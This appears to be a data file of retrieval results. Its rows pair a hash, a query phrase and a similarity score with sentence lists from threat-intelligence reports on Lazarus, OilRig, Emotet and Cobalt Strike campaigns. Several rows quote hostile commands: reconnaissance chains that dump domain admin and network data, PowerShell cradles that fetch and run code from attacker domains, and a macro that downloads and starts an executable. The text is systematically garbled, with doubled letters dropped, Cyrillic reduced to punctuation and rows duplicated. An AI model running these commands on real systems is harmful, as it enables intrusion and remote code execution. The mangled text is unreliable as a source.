:\\Windows\\Web\\systeminfo.txtb netstat -aon > :\\Windows\\Web\\systeminfo.txtb netstat -bv > :\\Windows\\Web\\systeminfo.txtb net use > :\\Windows\\Web\\systeminfo.txtb net share > :\\Windows\\Web\\systeminfo.txtb net view > :\\Windows\\Web\\systeminfo.txtb net view /domain > :\\Windows\\Web\\systeminfo.txtb net group /domain > :\\Windows\\Web\\systeminfo.txtb net user > :\\Windows\\Web\\systeminfo.txtb net user /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain controlers"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain admins"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain computers"" /domain > :\\Windows\\Web\\systeminfo.txtb nltest /domain_trusts > :\\Windows\\Web\\systeminfo.txtb route print > :\\Windows\\Web\\systeminfo.txtb arp -a > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\program files\\*.', '*"" > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\Program Files (x86)\\*.']"
cd55962babfd80de741da3cfcd92ebe3,cmd.exe /c,0.82672272449881,"['It is worth noting that these samples were al compiled after the domain began being used alongside the knf.gov[.', ']pl watering-hole.', 'Aditionaly, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed sugesting this is al part of the same campaign.', 'Despite this potential conection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware atempts to run a series of comands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These comands are as folows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Internet Setings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is sen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTP/1.1 Conection: Kep-Alive User-Agent: Mozila/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/2010101 Firefox/47.0 Host: w.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4c10ab3f4e6769e520694a10f61d5) does not use eye-watch[.', ']in as a C&C chanel but instead was downloaded from the URL: hxps:/w.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'."", 'The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.', ']ch site.']"
4cfa49159667f23c95faae1778231c91,cmd.exe /c,0.845503132152836,"['Modular architecture of the victims infection proces provides both aditional flexibility and anonymity throughout the cyber-atack.', 'This scheme alows hackers to divide software development activity betwen teams, as wel as to ensure the reuse of program code.', 'Recon Performs initial reconaisance to determine if a systems is of interest to the threat actors Droper Extracts and decrypts Loader Loader Decrypts the payload Client_RAT or Client_TraficForwarder and injects into the legitimate proces Client_TraficForwarder Forwards operators comands from external network into corporate network Client_RAT Provides ful control over the target system Recon is a backdor that is initialy instaled on the target machine through sucesful execution of exploits.', 'This module is used by hackers to perform initial reconaisance to search for systems of interest.', 'Once launched, the program ads itself to the auto-start by copying its file to the directory ""%USERPROFILE%\\ApData\\Roaming\\Microsoft\\Windows\\ Start Menu\\Programs\\Startup"", colects data about the system and network environment and sends them to the C&C server.', 'Below is a list of data colected: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\ CurentVersion\\Internet Setings cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find TCP 12 Lazarus arisen: architecture, tols, atribution 1 Key 2 Atack 3 Atack 4 Recomendations 5 Indicators of 6 Apendix Findings preparation and organizers compromise implementation In the event the system is not of interest, the module wil use the ""kilkil"" comand to remove itself from the infected system.', 'If the system is of interest, then Recon downloads Droper using the htp comand.', 'Droper wil then instal Client_RAT to the infected system as folows: RECON DROPER LOADER CLIENT_RAT 1 2 3 DROPER Recon decrypts LOADER Droper decrypts CLIENT_RAT Loader decrypts LOADER and embeds CLIENT_RAT and embeds Loader and embeds CLIENT_RAT Droper extracts decrypted Client_RAT Client_RAT Droper extracts and decrypts Loader, embeds it into the system and extracts Client_RAT.', 'To decrypt the configuration file, Droper neds MD5 encryption key, which only the atacker knows.', 'Group-IB specialists have analyzed two versions of Droper.', 'There are no fundamental diferences betwen them: both versions were used to decrypt the loader and encrypted payload, as wel as to ensure loader persistence in the system.']"
d5019121cbc645eb0787efab173a12b3,cmd.exe /c,0.8135172745614935,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
d5019121cbc645eb0787efab173a12b3,cmd.exe /c,0.7962584600454754,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
af9a848f4c926a7dce431e4a9399b939,cmd.exe /c,0.7597704693771454,"['NEW EMOTET WAVES Fortunately, the VMware Threat Analysis Unit has a tol at its disposal, caled Symbexcel, that aplies symbolic execution techniques to the analysis of Excel macros.16 Using this tol, we can automaticaly de-obfuscate the XL4 macros and identify the aditional components being downloaded (se Figure 6).', 'Figure 6: A de-obfuscated XL4 macro.', 'The functionality of the macro is threfold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The atackers may chose to use multiple hosts to increase the chances to download the payload and improve suces rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by runing rundl32.exe.', '3.', 'Gain registry persistence by runing DlRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC comand line is shown Figure 6).', 'The payload is a DL file, which (unsurprisingly) is the main Emotet DL.', 'In the case of the Excel document with hash 7c0d0a80e7eb3af7ce549df78a5a68cbd5deb5, the DL is 8cf39a587aeb8f075a0ae23a42e16ce3656e71.']"
6676698d65e372feb79c0159d9d2b11e,cmd.exe /c,1.0,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
3d2e99ba94188b71a17364073a49e3ea,a batch file,0.7657437517555142,"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Midle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18 Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many comodity loaders were poly- morphic (change their hash on every execution) and suported atackers' hands-on-keyboard activities for information gathering, disabling security setings, and forging the way for ransomware atacks.""]"
d5019121cbc645eb0787efab173a12b3,an injected Cobalt Strike beacon,0.8182485282012155,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
d730c0d5c6d253afc835c1d745e4bd3c,an injected Cobalt Strike beacon,0.8182485282012155,"['cert.gov.ua /article/39708 "" Cobalt Strike Beacon (CERT-UA#490) : CERT-UA ""!', '! ""', 'XLS- "" .xls"", .', ', , ""pe.dl"". \'', 'Cobalt Strike Beacon.', ', ""pe.dl"", , ""spisok.exe"" CERT-UA#464, , TrickBot.', 'UAC-098.', ': : 87f834e878d05b625ba639b9318512 ea9dae45f81fe3527c62ad7b84b03d19629014b1a0e346b6a93e52b0929d8a .xls e28ac0f94df7519a60ec860475e6b3 90fe0d8ac0b4a6040d5979afd82c212d9aec2b90e5d10c0b15de8d61b1 pe.dl (202-04-15) a3534c24a76fa81ce38676027de953 39a868e8452469491d6a25126414f0bfaca4f64d3fd10151854c34107262 shelcode.bin.packed.dl eb18207d505a1de30af6c7bafd28e8e f30fd64297ac41937f9a018753871fe0e84fbcf7bf92bf5f8d6f57090 notevil.dl (CS Beacon) : hxp:/138[.', ']68.29.0/pe.dl hxps:/dezword[.', ']com/apiv8/getStatus 1/3 hxps:/dezword[.']"
4dcefb3ef7b7b77dc19a9ceac312321c,an injected Cobalt Strike beacon,0.8182485282012155,"['cert.gov.ua /article/3815 Cobalt Strike Beacon (CERT-UA#427) Cobalt Strike Beacon (CERT-UA#427) CERT-UA RAR- "".rar"", RAR- "" 21.03.rar"", , , SFX- "" filercs.rar"" ( \' right-to-left overide (RTLO) ).', ', VBScript- (Thumbs.db), .NET- ""dhdhk0k34.com"". \'', 'Cobalt Strike Beacon.', ', ""inject.exe"" - 15.03.202 , VBScript-, UAC-051 (unc151/GhostWriter).', 'MD5 SHA256 e4b54e2f068762179e7e514d90bf16 fbabc4e5a6470606fc64c39c182b5a7a71f8fa96f50c6725d52abf184f75fd4 .rar 4a78df3d4f987103dc0c0f3a302b8cb 59ed536e195e310f321435d43ca8b60cb3746514f3c3ea951d4363cacbe7bc 21.03.rar bcdab4ae6281f69765bfb9cb909d2 6149680c8541980d46c17681e37e4751e2baca1d13e648b818dfb24bf56f7c file rcs.rar b525108912e8d5f1519f1b52723e8 d324d7f3098493176f878a81c7c1f4f979ad3d759c7f3427ba10d9deb1f6 Thumbs.db 303286735a07ae5d14db9c12843d4e f98e1e61c84a5ed098e7481ab39e28195f4d1b101c92b813eb7f56e63d dhdhk0k34.com 18e73c3d5eda742530ba3fef59e3943 1/2 37e64de0ad76bac9c512135a03a459b1a97917383765bf3df94e9af7e29 Skype.exe b724f750df495e634df0f126384 7cf3f758b2ab303dec89736dfd5c38309a21aec2d83d3d4e590f9538fc5f15 inject.exe (202-03-15) 1365b82e7da0968e97c095d8bd916d c14fce93183dc4173be02b2a48d1ed06b43656c7b6d5a290d948b6947df903 csbeacon.bin (Cobalt Strike Beacon) hXps:/ao3.hmgo[.', ']pw/tags/Akihabara@TODEP/works hXps:/ao3.hmgo[.', ']pw/tags/Akihabara@TODEP/works/update ao3.hmgo[.', ']pw hmgo[.']"
e15fbf8bdb3a2ebc68fdf55143a7f9b8,"host,",0.8463257977998344,"['Using this IP validation scheme, the actor verifies whether the incoming request is from the victim or not.', '6.', 'On top of that, the operator relies on several other proceses to carefuly deliver the next payload such as checking OS type and predefined user-agent strings.', '2/14 C2 server structure C2 script (download.php) for malicious document delivery As a result of analyzing the server-side script to convey a malicious document, we figured out how this actor verifies the request from the client and minimizes exposure of their payload.', 'This script works with a specific parameter name from the victim, so we suspect the actor delivers a download link to the victim via email or by sending a request using another type of payload.', '1.', 'It checks the who GET parameter from the victim.', 'The who parameter contains an email adres without a domain name.', '1 if (iset($_GET[\'who\']) & $_GET[\'who\'] = ""[redacted]"") # Check \'who\' parameter value 2 { 3 4 $vbs_server = ""weworld59.myartsonline.com""; # The next stage server 5 $virus = ""v.doc""; # Malicious document 6 $unvirus = ""un.doc""; # Benign document 7 $downame = ""CV.DHOM Alexandra Sidal (Korean).doc""; # Delivered file name 8 9 $who = $_GET[\'who\']; 10 $down = $who .', '"".txt""; 3/14 2.', 'If the incoming request contains an expected email adres, it saves the date, IP adres and user-agent to the [who]_downhistory.txt file.']"
590c31917b9236061e9e5656fb64e3d2,"host,",0.8478811096128493,"['Similar to the document sent by ""Harald,"" this document also used remote template injection to download Korg.', ""KorgTA453's Latest Remote Template Injection As noted above, some of TA453's campaigns delivered OneDrive links that hosted malicious documents."", 'The documents are the latest version of the TA453 remote template injection documents discused by 6/8 PwC in July 202.', 'The pasword protected documents downloaded the macro enabled template documents from 354pstw4a5f8.filecloudonline[.]com.', 'Profpoint observed multiple campaigns reusing that specific filecloudonline[.', ']com host.', 'The downloaded template, dubed Korg by Profpoint, has thre macros: Module1.bas, Module2.bas, and ThisDocument.cls.', ""The macros colect information such as username, list of runing proceses along with the user's public IP from my-ip.io and then exfiltrates that information using the Telegram API."", 'At this time, Profpoint has only observed the beaconing information and has not observed any folow-on exploitation capabilities.', 'The lack of code execution or comand and control capabilities within the TA453 macros is abnormal.', 'Profpoint judges that infected users may be subject to aditional exploitation based on the software identified on their machines.']"
f94413a0a129ef725b967da1d8b7eb6e,"host,",1.0,"['17 htp:/w.clearskysec.com/oilrig/ Page 12 of 48 Al rights reserved to ClearSky cyber security and Trend Micro, 2017 The self-extracting executable serves as a downloader, runing the folowing comand: cmd.exe /c powershel.exe -nop -w hiden -c ""(new-object net.webclient).downloadstring(\'htp:/jpsrv-java-jdkec2.javaupdate[.', ']co:80/JPOST\')"" The C&C server sends back a short PowerShel code that loads a Cobalt Strike stager into memory.', 'Base64 encoded PowerShel code that loads Cobalt Strike stager into memory Stager shelcode with marked user agent and C&C server adres Both the docx and the executable contained the name shiranz in their metadata or file paths: LastModifiedBy shiranz C:\\Users\\shiranz\\Desktop\\checkpointslvpn?fdp.exe C:\\Users\\shiranz\\ApData\\Local\\Temp\\checkpointslvpn?fdp.exe Page 13 of 48 Al rights reserved to ClearSky cyber security and Trend Micro, 2017 In another sample, the decoy document was in Turkish, indicating the target\'s nationality.18 This document was likely stolen from the Turkish Ministry of Foreign Afairs: test_fdp.exe.19 Decoy document in Turkish While the decoy PDF document is opened, the folowing comands are executed: cmd.exe /c copy Ma_1.tmp ""%userprofile%\\ApData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup""\\CheckpointGO.pif& copy slvpn.tmp %userprofile%\\desktop\\slvpnmanual.pdf& cd %userprofile%\\desktop& slvpnmanual.pdf cmd.exe /c powershel.exe -nop -w hiden -c ""IEX (new-object net.webclient).downloadstring(\'htp:/jpsrv-java-jdkec2.javaupdate[.', ']co:80/Sourcefire\')"" 18 htps:/w.hybrid-analysis.com/sample/a4adbea4fcb242f7eac48dbf13c814d5ec920f7dce01b2c8b56a806cd37 19 htps:/w.virustotal.com/en/file/a4adbea4fcb242f7eac48dbf13c814d5ec920f7dce01b2c8b56a806cd37/analysis Page 14 of 48 Al rights reserved to ClearSky cyber security and Trend Micro, 2017 Malicious Macros In October 2016, the atackers uploaded to VirusTotal multiple files containing macros, likely to learn if they are detected by antivirus engines.', 'For example, ""Date.dotm"" contains this default Word template content:20 A default template of a Word document used as decoy The macro runs a Cobalt Strike stager that comunicates with wk-in-f104.1c10.n.microsoft-security[.', ']host .', ""The atackers also uploaded an executable files that would run a Word document with content in Hebrew.21 Hebrew decoy document The word document contains a macro that runs the folowing comand: cmd.exe /c powershel -ExecutionPolicy bypas -noprofile -windowstyle hiden (New-Object System.Net.WebClient).DownloadFile('htp:/pht.is.nlb-deploy.edge-dyn.e1.f20.ads-youtube."", ""online/winini.exe','%TEMP%\\XU.exe');&start %TEMP%\\XU.exe& exit In paralel, the executable drops d5tjo.exe, which is the legitimate Madshi debuging tol 23 20 htps:/w.virustotal.com/en/file/7e3c9323be2898d926df3eb6e73a46c28e8e34630a2bd1db96aeb39586aeb/analysis/ 21 htps:/w.virustotal.com/en/file/9e5ab438deb327e2626c27891b3573c30213b8d239abc7f9a7ef9c4f7b/analysis 2 htps:/w.virustotal.com/en/file/7ad65e39b79ad56c02a90dfab8090392ec5fed10a8e276b86ec9b1f2524ad31/analysis 23 htp:/help.madshi.net/madExcept.htm Page 15 of 48 Al rights reserved to ClearSky cyber security and Trend Micro, 2017 Fake Social Media Entities Back in 2013, CopyKitens used several Facebok profiles to spread links to a website impersonating Haretz news, an Israeli newspaper."", 'In the screnshot below you can se the fake profile linking to haretz.co[.', ']il (note the extra t in the domain).', '""Erick Brown""24 Fake profile ""Erik Brown"" posting link to malicious website ""Amanda Morgan""25 Fake profile ""Amanda Morgan"" posting link to malicious website The later profile taged a fake Israeli profile as her cousin, "" ""26 Fake profile "" "" 24 htps:/w.facebok.com/israelhoughtonandplanetshakersphilipineconcert/posts/7164941845349 25 htps:/w.facebok.com/ynetnews/posts/548075141952763 26 htps:/w.facebok.com/profile.php?id=103169608706 Page 16 of 48 Al rights reserved to ClearSky cyber security and Trend Micro, 2017 Who in turn taged another fake Israeli profile as her cousin 27 Fake profile "" "" While ""Erik Brown"" has not ben publicly active since September 2015, and the two other Israeli profiles have not ben publicly active since September 2013, Amanda Morgan is stil active to date.']"
f94413a0a129ef725b967da1d8b7eb6e,"host,",1.0,"['17 htp:/w.clearskysec.com/oilrig/ Page 12 of 48 Al rights reserved to ClearSky cyber security and Trend Micro, 2017 The self-extracting executable serves as a downloader, runing the folowing comand: cmd.exe /c powershel.exe -nop -w hiden -c ""(new-object net.webclient).downloadstring(\'htp:/jpsrv-java-jdkec2.javaupdate[.', ']co:80/JPOST\')"" The C&C server sends back a short PowerShel code that loads a Cobalt Strike stager into memory.', 'Base64 encoded PowerShel code that loads Cobalt Strike stager into memory Stager shelcode with marked user agent and C&C server adres Both the docx and the executable contained the name shiranz in their metadata or file paths: LastModifiedBy shiranz C:\\Users\\shiranz\\Desktop\\checkpointslvpn?fdp.exe C:\\Users\\shiranz\\ApData\\Local\\Temp\\checkpointslvpn?fdp.exe Page 13 of 48 Al rights reserved to ClearSky cyber security and Trend Micro, 2017 In another sample, the decoy document was in Turkish, indicating the target\'s nationality.18 This document was likely stolen from the Turkish Ministry of Foreign Afairs: test_fdp.exe.19 Decoy document in Turkish While the decoy PDF document is opened, the folowing comands are executed: cmd.exe /c copy Ma_1.tmp ""%userprofile%\\ApData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup""\\CheckpointGO.pif& copy slvpn.tmp %userprofile%\\desktop\\slvpnmanual.pdf& cd %userprofile%\\desktop& slvpnmanual.pdf cmd.exe /c powershel.exe -nop -w hiden -c ""IEX (new-object net.webclient).downloadstring(\'htp:/jpsrv-java-jdkec2.javaupdate[.', ']co:80/Sourcefire\')"" 18 htps:/w.hybrid-analysis.com/sample/a4adbea4fcb242f7eac48dbf13c814d5ec920f7dce01b2c8b56a806cd37 19 htps:/w.virustotal.com/en/file/a4adbea4fcb242f7eac48dbf13c814d5ec920f7dce01b2c8b56a806cd37/analysis Page 14 of 48 Al rights reserved to ClearSky cyber security and Trend Micro, 2017 Malicious Macros In October 2016, the atackers uploaded to VirusTotal multiple files containing macros, likely to learn if they are detected by antivirus engines.', 'For example, ""Date.dotm"" contains this default Word template content:20 A default template of a Word document used as decoy The macro runs a Cobalt Strike stager that comunicates with wk-in-f104.1c10.n.microsoft-security[.', ']host .', ""The atackers also uploaded an executable files that would run a Word document with content in Hebrew.21 Hebrew decoy document The word document contains a macro that runs the folowing comand: cmd.exe /c powershel -ExecutionPolicy bypas -noprofile -windowstyle hiden (New-Object System.Net.WebClient).DownloadFile('htp:/pht.is.nlb-deploy.edge-dyn.e1.f20.ads-youtube."", ""online/winini.exe','%TEMP%\\XU.exe');&start %TEMP%\\XU.exe& exit In paralel, the executable drops d5tjo.exe, which is the legitimate Madshi debuging tol 23 20 htps:/w.virustotal.com/en/file/7e3c9323be2898d926df3eb6e73a46c28e8e34630a2bd1db96aeb39586aeb/analysis/ 21 htps:/w.virustotal.com/en/file/9e5ab438deb327e2626c27891b3573c30213b8d239abc7f9a7ef9c4f7b/analysis 2 htps:/w.virustotal.com/en/file/7ad65e39b79ad56c02a90dfab8090392ec5fed10a8e276b86ec9b1f2524ad31/analysis 23 htp:/help.madshi.net/madExcept.htm Page 15 of 48 Al rights reserved to ClearSky cyber security and Trend Micro, 2017 Fake Social Media Entities Back in 2013, CopyKitens used several Facebok profiles to spread links to a website impersonating Haretz news, an Israeli newspaper."", 'In the screnshot below you can se the fake profile linking to haretz.co[.', ']il (note the extra t in the domain).', '""Erick Brown""24 Fake profile ""Erik Brown"" posting link to malicious website ""Amanda Morgan""25 Fake profile ""Amanda Morgan"" posting link to malicious website The later profile taged a fake Israeli profile as her cousin, "" ""26 Fake profile "" "" 24 htps:/w.facebok.com/israelhoughtonandplanetshakersphilipineconcert/posts/7164941845349 25 htps:/w.facebok.com/ynetnews/posts/548075141952763 26 htps:/w.facebok.com/profile.php?id=103169608706 Page 16 of 48 Al rights reserved to ClearSky cyber security and Trend Micro, 2017 Who in turn taged another fake Israeli profile as her cousin 27 Fake profile "" "" While ""Erik Brown"" has not ben publicly active since September 2015, and the two other Israeli profiles have not ben publicly active since September 2013, Amanda Morgan is stil active to date.']"
475cc557a403e5a686bf4e9a5b16e3d2,"host,",1.0,"['We make sure your homes, vehicles, and any other asets which require titling stay out of your name.', 'Contact us to reserve a consultation.', 'IntelTechniques.com UPDATES By Michael Bazel This quarter, I anounced thre big updates to the fre resources available at IntelTechniques.com.', 'OSINT Tols This magazine serves as a compliment to the podcast, which Thre years ago, we were bulied into taking our search tols can be found at IntelTechniques.com.', 'Below are sumaries of the ofline, threatened with lawsuits, and suspended by our web episodes from last month.', 'host.', 'Now, the tols return with updates, fre for everyone.', 'New features are being aded wekly.', 'The latest version of al 267-macOS Privacy & Security Revisited: After a lot of talk tols can be found at the folowing URL.', 'about Linux, I revisit privacy and security considerations for macOS machines.', 'htps:/inteltechniques.com/tols/ 268-CW Permits, UNREDACTED 03, & Linux Questions: I discus the California CW leak, release the latest isue of Credential Exposure Removal Guide UNREDACTED Magazine, and answer several listeners Linux questions.']"
eedc908904741699e76852465550c3cd,network configuration,0.772664926447511,"['The most protocols for Linux and Unix.', 'heavily afected were Swiscom NOVEMBER 25, 2018 (AS303) based in Switzerland, KPN (AS136) based in the Netherlands, Krek Ltd, a smal-scale Rusian and Bouygues Telecom (AS5410) and The cases described above show operator, made a mistake in its BGP Numericable-SFR (AS21502) based that manipulating trafic does not configuration, causing 10-20% of in France.', 'The incident lasted for two require aces to the targeted Rusian Internet users to lose aces hours.', '[3] companys network hardware.', 'Aces to thousands of services.', 'The failure to an area border router is enough lasted for more than an hour and to be able to change the BGP afected major companies such as Another noteworthy example is a 2019 configuration.', 'Amazon, YouTube, VK (Rusian social network), ivi.ru (online video streaming experiment, the aim of which was So far, BGP hijacking has had large-scale service), and many others.', '[1] to analyze new BGP security features.', 'but short-term efects.', 'For prolonged It culminated in the failure of routers sabotage, threat actors wil ned to have of Internet service providers in Asia and both aces to the network routers Australia.', 'of several operators as wel as pre- prepared scenarios for manipulating trafic.']"
8d2f7e9f01ec7f234b9e60df5ad44fec,network configuration,0.772664926447511,"['The most protocols for Linux and Unix.', 'heavily afected were Swiscom NOVEMBER 25, 2018 (AS303) based in Switzerland, KPN (AS136) based in the Netherlands, Krek Ltd, a smal-scale Rusian and Bouygues Telecom (AS5410) and The cases described above show operator, made a mistake in its BGP Numericable-SFR (AS21502) based that manipulating trafic does not configuration, causing 10-20% of in France.', 'The incident lasted for two require aces to the targeted Rusian Internet users to lose aces hours.', '[3] companys network hardware.', 'Aces to thousands of services.', 'The failure to an area border router is enough lasted for more than an hour and to be able to change the BGP afected major companies such as Another noteworthy example is a 2019 configuration.', 'Amazon, YouTube, VK (Rusian social network), ivi.ru (online video streaming experiment, the aim of which was So far, BGP hijacking has had large-scale service), and many others.', '[1] to analyze new BGP security features.', 'but short-term efects.', 'For prolonged It culminated in the failure of routers sabotage, threat actors wil ned to have of Internet service providers in Asia and both aces to the network routers Australia.', 'of several operators as wel as pre- prepared scenarios for manipulating trafic.']"
2efb81cfee7cc928b505f290b6b380fd,network configuration,0.772664926447511,"['It uses at-isue clas method that PMaper stores data about AWS acounts and JndiLokup lokup() 6 2021 NC Group Anual Research Report Dynamic Virtual Chanel that enables us to comunicate We also released source code for a variety optimizations found in pairing-based cryptography, over an open RDP/Citrix conection without the ned to of cryptographic implementations, exploit foundational to the BLS Signatures central to Ethereum open a new socket, conection or a port on a firewal.', '2.0, zero-knowledge arguments central to Zcash, Filecoin, profs-of-concept, and obfuscation The author, Balazs Bucsay, presented the tol at the and other blockchain/cryptocurency projects relying reverse-enginering techniques: Cyber Security Global Sumit by Gekle.', 'upon zk-profs.', 'In January 2021, Jef Dileo released prof-of-concept Solitude: Solitude is an open source privacy analysis In October 2021, Thomas Pornin implemented a exploit code for his vulnerability, CVE-2020-15257, found tol that enables you to conduct your own privacy mathematicaly-imposible losles compresion in containerd - a container runtime underpining Docker investigations into where your private data goes once it algorithm, alongside a blog post titled Paradoxical and comon Kubernetes configurations - which resulted leaves your web browser or mobile device.', 'Whether a Compresion with Verifiable Delay Functions, and in ful rot container escape for a comon container curious novice or a more advanced researcher, Solitude released a paper on the IACR ePrint archive.', 'configuration.', 'This was discused in depth in his blog makes the proces of evaluating an aps privacy acesible for everyone, created by Dan Hastings.', 'post titled, A BSTRACT SHIMER (CVE-2020-15257): In October 2021, Nicolas Guigo released tols and Solitude was featured in media outlets including KitPloit, Host Networking is rot-Equivalent, Again.', 'methods for reversing real-world binary obfuscation, Hacking Land, and Hacking Reviews.', 'through a blog post titled A Lok At Some Real-World In January 2021, Thomas Pornin published a blog post Obfuscation Techniques.', 'on Double-od Eliptic Curves, which discused some Squeak: The tol was described in their blog post, MSQL Lateral Movement, created by David Cash.']"
73ae3d11837c3f9dbcfc8f41544bb20e,ipconfig,0.80966835917559,"[' .', '2017.', '2 0 1 7.', '- (Ii -) .46535.I5 3 474 2 0 1 7.', '2017 1 3 1.1 .3 1.2 .3 1.3 .3 1.4 .5 1.5 , , , , .25 1.6 - .30 1.7 .31 1.8 .31 1.9 .31 32 314 320 2 1 1.1 1.1.1 ( ) () - RU.0176-01 ( ), , - () .', '1.2 1.2.1 - () - 1 , - .']"
9cd7c673b04415e320b2ceea1c818934,This was double base64 encoded.,0.8509482582982146,"['The exploitation method used in this campaign relies upon a remote Ofice template injection method, a technique that we have sen state actors use recently.', 'However, it is not uncomon to use tols such as EvilClipy to manipulate the behavior of Microsoft Ofice documents.', 'For example, threat actors can use pre-built kits to manipulate clean documents and embed malicious elements; this saves time and efort.', 'This method wil generate a consistent format that can be used throughout campaigns.', 'As a result, we have observed a consistency with how some of the malicious elements are embeded into the documents (i.e.', 'double base64 encoded payload).', 'Further maping these techniques acros the MITRE AT&CK framework enables us to visualize diferent techniques the adversary used to exploit their victims.', 'MITRE AT&CK maping for malicious documents These Microsoft Ofice templates are hosted on a comand and control server and the downloaded link is embeded in the first stage malicious document.', 'The job postings from these lure documents are positions for work with specific US defense programs and groups: F-2 Fighter Jet Program Defense, Space and Security (DS) Photovoltaics for space solar cels Aeronautics Integrated Fighter Group Military aircraft modernization programs Like previous operations, the adversary is using these lures to target individuals, likely posing as a recruiter or someone involved in recruitment.', 'Some of the job postings we have observed: Senior Design Enginer System Enginer Profesional networks such as LinkedIn could be a place used to deliver these types of job descriptions.', 'Defensive Architecture Recomendations Defeating the tactics, techniques and procedures utilized in this campaign requires a defense in depth security architecture that can prevent or detect the atack in the early stages.']"
9cd7c673b04415e320b2ceea1c818934,This was double base64 encoded.,0.8509482582982146,"['The exploitation method used in this campaign relies upon a remote Ofice template injection method, a technique that we have sen state actors use recently.', 'However, it is not uncomon to use tols such as EvilClipy to manipulate the behavior of Microsoft Ofice documents.', 'For example, threat actors can use pre-built kits to manipulate clean documents and embed malicious elements; this saves time and efort.', 'This method wil generate a consistent format that can be used throughout campaigns.', 'As a result, we have observed a consistency with how some of the malicious elements are embeded into the documents (i.e.', 'double base64 encoded payload).', 'Further maping these techniques acros the MITRE AT&CK framework enables us to visualize diferent techniques the adversary used to exploit their victims.', 'MITRE AT&CK maping for malicious documents These Microsoft Ofice templates are hosted on a comand and control server and the downloaded link is embeded in the first stage malicious document.', 'The job postings from these lure documents are positions for work with specific US defense programs and groups: F-2 Fighter Jet Program Defense, Space and Security (DS) Photovoltaics for space solar cels Aeronautics Integrated Fighter Group Military aircraft modernization programs Like previous operations, the adversary is using these lures to target individuals, likely posing as a recruiter or someone involved in recruitment.', 'Some of the job postings we have observed: Senior Design Enginer System Enginer Profesional networks such as LinkedIn could be a place used to deliver these types of job descriptions.', 'Defensive Architecture Recomendations Defeating the tactics, techniques and procedures utilized in this campaign requires a defense in depth security architecture that can prevent or detect the atack in the early stages.']"
